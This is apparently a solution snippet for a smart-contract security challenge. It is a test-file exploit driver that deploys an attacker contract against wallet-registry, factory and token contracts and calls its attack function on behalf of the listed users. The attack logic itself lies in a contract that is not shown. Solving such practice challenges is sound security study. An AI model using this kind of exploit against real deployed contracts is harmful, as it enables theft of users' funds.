// added this to the top of the test file
const RegistryAttacker = require('../../artifacts/contracts/attacker-contracts/RegistryAttacker.sol/RegistryAttack.json')

// the attacking function
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        this.attackerContractFactory = await ethers.getContractFactory(RegistryAttacker.abi, RegistryAttacker.bytecode, attacker)
        this.attackerContract = 
            await this.attackerContractFactory.deploy(
                this.masterCopy.address,
                this.walletFactory.address,
                this.walletRegistry.address,
                this.token.address )
        await this.attackerContract.attack(users, attacker.address)
});
